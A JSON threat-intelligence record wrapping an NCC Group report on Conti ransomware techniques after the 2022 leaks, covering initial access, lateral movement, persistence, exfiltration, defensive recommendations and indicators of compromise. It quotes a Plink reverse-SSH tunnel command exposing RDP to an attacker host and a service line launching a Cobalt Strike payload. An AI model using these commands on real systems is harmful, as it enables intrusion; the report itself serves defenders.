{
    "id": "f58b4ac8-47b7-494d-b1ef-2965e6370992",
    "created_at": "2023-01-12T15:02:03.285412Z",
    "updated_at": "2025-03-27T02:09:17.942448Z",
    "deleted_at": null,
    "sha1_hash": "ee72c9137e56e7d2ca3958ac83fd6dc8f2390323",
    "title": "2022-03-31 - Conti-nuation- methods and techniques observed in operations post the leaks",
    "authors": "",
    "file_creation_date": "2022-05-28T17:14:12Z",
    "file_modification_date": "2022-05-28T17:14:12Z",
    "file_size": 167123,
    "plain_text": "# Conti-nuation: methods and techniques observed in operations post the leaks\n\n**[research.nccgroup.com/2022/03/31/conti-nuation-methods-and-techniques-observed-in-operations-post-the-leaks/](https://research.nccgroup.com/2022/03/31/conti-nuation-methods-and-techniques-observed-in-operations-post-the-leaks/)**\n\nMarch 31, 2022\n\nAuthored by: Nikolaos Pantazopoulos, Alex Jessop and Simon Biggs\n\n## Executive Summary\n\nIn February 2022, a Twitter account which uses the handle ‘ContiLeaks’, started to publicly release information\nfor the operations of the cybercrime group behind the Conti ransomware. The leaked data included private\nconversations between members along with source code of various panels and tools (e.g. Team9 backdoor panel\n\n[1]). Furthermore, even though the leaks appeared to have a focus on the people behind the Conti operations,\nthe leaked data confirmed (at least to the public domain) that the Conti operators are part of the group, which\noperates under the ‘TheTrick’ ecosystem. For the past few months, there was a common misconception that\nConti was a different entity.\n\nDespite the public disclosure of their arsenal, it appears that Conti operators continue their business as usual by\nproceeding to compromise networks, exfiltrating data and finally deploying their ransomware. This post describes\nthe methods and techniques we observed during recent incidents that took place after the Conti data leaks.\n\nOur findings can be summarised as below:\n\nMultiple different initial access vectors have been observed.\nThe operator(s) use service accounts of the victim’s Antivirus product in order to laterally move through the\nestate and deploy the ransomware.\n\n\n-----\n\nAfter getting access, the operator(s) attempted to remove the installed Antivirus product through the\nexecution of batch scripts.\nTo achieve persistence in the compromised hosts, multiple techniques were observed;\n\nService created for the execution of Cobalt Strike.\nMultiple legitimate remote access software, ‘AnyDesk’, ‘Splashtop’ and ‘Atera’, were deployed. (Note:\n_This has been reported in the past too by different vendors)_\n\nLocal admin account ‘Crackenn’ created. (Note: This has been previously reported by Truesec\n_as a Conti behaviour [2])_\nBefore starting the ransomware activity, the operators exfiltrated data from the network with the legitimate\nsoftware ‘Rclone’ [3].\n\nIt should be noted that the threat actor(s) might use different tools or techniques in some stages of the\ncompromise.\n\n## Initial Access\n\nMultiple initial access vectors have been observed recently; phishing emails and the exploitation of Microsoft\nExchange servers. The phishing email delivered to an employer proceeded to deploy Qakbot to the users Citrix\nsession. The targeting of Microsoft Exchange saw ProxyShell and ProxyLogon vulnerabilities exploited. When\nthis vector was observed, the compromise of the Exchange servers often took place two – three months prior to\nthe post exploitation phase. This behaviour suggests that the team responsible for gaining initial access\ncompromised a large number of estates in a small timeframe.\n\nWith a number of engagements, it was not possible to ascertain the initial access due to dwell time and evidence\nretention. However, other initial access vectors utilised by the Conti operator(s) are:\n\nCredential brute-force\nUse of publicly available exploits. We have observed the following exploits being used:\n\nFortigate VPN\n\nCVE-2018-13379\nCVE-2018-13374\nLog4Shell\n\nCVE-2021-44228\nPhishing e-mail sent by a legitimate compromised account.\n\n## Lateral Movement\n\nIn one incident, after gaining access to the first compromised host, we observed the threat actor carrying out the\nfollowing actions:\n\nDownload AnyDesk from hxxps://37.221.113[.]100/anydesk.exe\nDeployment of the following batch files:\n\n1.bat, 2.bat, 111.bat\n\nRansomware propagation\nRemovesophos.bat, uninstallSophos.bat\n\nUninstalls Sophos Antivirus solution\nAspx.bat\n\nContains a command-line, which executes the dropped executable file ‘ekern.exe’.\n‘ekern.exe’ is a command line connection tool known as Plink [4]\nThis file establishes a reverse SSH tunnel that allows direct RDP connection to the\ncompromised host.\n_ekern.exe -ssh -P 53 -l redacted-pw redacted -R REDACTED_IP:59000:127.0.0.1:3389_\n\n\n-----\n\nAfter executing the above files, we observed the following utilities being used for reconnaissance and movement:\n\nRDP\nADFind\nBloodhound to identify the network topology.\nnetscan.exe for network shares discovery.\nCobalt Strike deployed allowing the threat actor to laterally move throughout the network.\n\nThe common techniques across the multiple Conti engagements are the use of RDP and Cobalt Strike.\n\n## Persistence\n\nThe threat actor leveraged Windows services to add persistence for the Cobalt Strike beacon. The primary\npersistence method was a Windows service, an example can be observed below:\n\n_A service was installed in the system._\n\n_Service Name: REDACTED_\n\n_Service File Name: cmd.exe /c C:\\ProgramData\\1.msi_\n\n_Service Type: user mode service_\n\n_Service Start Type: demand start_\n\n_Service Account: LocalSystem_\n\nIn addition, services were also installed to provide persistence for the Remote Access Tools deployed by the\nthreat actor:\n\nAnyDesk\nSplashtop\nAtera\n\nAnother Conti engagement saw no methods of persistence. However, a temporary service was created to\nexecute Cobalt Strike. It is hypothesized that the threat actor planned to achieve their objective quickly and\ntherefore used services for execution rather than persistence.\n\nIn a separate engagement, where the initial access vector was phishing and lead to the deployment of Qakbot,\nthe threat actor proceeded to create a local admin account named ‘Crackenn’ for persistence on the host.\n\n## Privilege Escalation\n\nConti operator(s) managed to escalate their privileges by compromising and using different accounts that were\nfound in the compromised host. The credentials compromised in multiple engagements was achieved by\ndeploying tools such as Mimikatz.\n\nOne operator was also observed exploiting ZeroLogon to obtain credentials and move laterally.\n\n## Exfiltration and Encryption\n\nSimilar to many other threat actors, Conti operator(s) exfiltrate a large amount of data from the compromised\nnetwork using the legitimate software ‘Rclone’. ‘Rclone’ was configured to upload to either Mega cloud storage\nprovider or to a threat actor controlled server. Soon after the data exfiltration, the threat actor(s) started the data\n\n\n-----\n\nencryption. In addition, we estimate that the average time between the lateral movement and encryption is five\ndays.\n\nAs discussed earlier on, the average dwell time of a Conti compromise is heavily dependant on the initial access\nmethod. Those incidents that have involved ProxyShell and ProxyLogon, the time between initial access and\nlateral movement has been three – six months. However once lateral movement is conducted, time to completing\ntheir objective is a matter of days.\n\n## Recommendations\n\nMonitor firewalls for traffic categorised as filesharing\nMonitor firewalls for anomalous spikes in data leaving the network\nPatch externally facing services immediately\nMonitor installed software for remote access tools\nRestrict RDP and SMB access between hosts\nImplement a Robust Password Policy [5]\nProvide regular security awareness training\n\n## Indicators of Compromise\n\n\n**Indicator Value** **Indicator**\n**Type**\n\n37.221.113[.]100/anydesk.exe IP\nAddress\n\n103.253.208[.]79 IP\nAddress\n\n\n**Description**\n\nHosts\nAnyDesk\n\nCobalt\nStrike\ncommandand-control\nserver\n\n\nC:\\ProgramData\\1.msi Filename Cobalt\nStrike\npayload\n\nC:\\ProgramData\\1.dll Filename Cobalt\nStrike\npayload\n\n\n223.29.205[.]54 IP\nAddress\n\n\nAnyDesk IP\naddress of\nthe\noperator.\n\n\nC:\\Windows\\sv.exe Filename Rclone\n\nC:\\Windows\\svchost.conf Filename Rclone\nconfig\n\nE03AF25994222D4DC6EFD98AE65217A03A5B40EEDCFFAC45F098E2A6F68F3F41 SHA256 Sv.exe –\nRclone\n\nC:\\Users\\Public\\Report_18.xls Filename Cobalt\nStrike\npayload\n\n\n-----\n\nC:\\Users\\Public\\x86_16.dll Filename Cobalt\nStrike\npayload\n\nCrackenn Account Local admin\naccount\ncreated on\npatient zero\n\nC:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Abevi\\<random characters>.dll Filename Qakbot\npayload\n\nC:\\Users\\Public\\AdFind.exe Filename ADFind\n\n\n23.82.140[.]234 IP\nAddress\n\n23.81.246[.]179 IP\nAddress\n\n\nCobalt\nStrike\ncommandand-control\nserver\n\nCobalt\nStrike\ncommandand-control\nserver\n\n\nhijelurusa[.]com Domain Cobalt\nStrike\ncommandand-control\nserver\n\n## References\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-03-31 - Conti-nuation- methods and techniques observed in operations post the leaks.pdf"
    ],
    "report_names": [
        "2022-03-31 - Conti-nuation- methods and techniques observed in operations post the leaks.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535723,
    "ts_updated_at": 1743041357,
    "ts_creation_date": 1653758052,
    "ts_modification_date": 1653758052,
    "files": {
        "pdf": "https://archive.orkl.eu/ee72c9137e56e7d2ca3958ac83fd6dc8f2390323.pdf",
        "text": "https://archive.orkl.eu/ee72c9137e56e7d2ca3958ac83fd6dc8f2390323.txt",
        "img": "https://archive.orkl.eu/ee72c9137e56e7d2ca3958ac83fd6dc8f2390323.jpg"
    }
}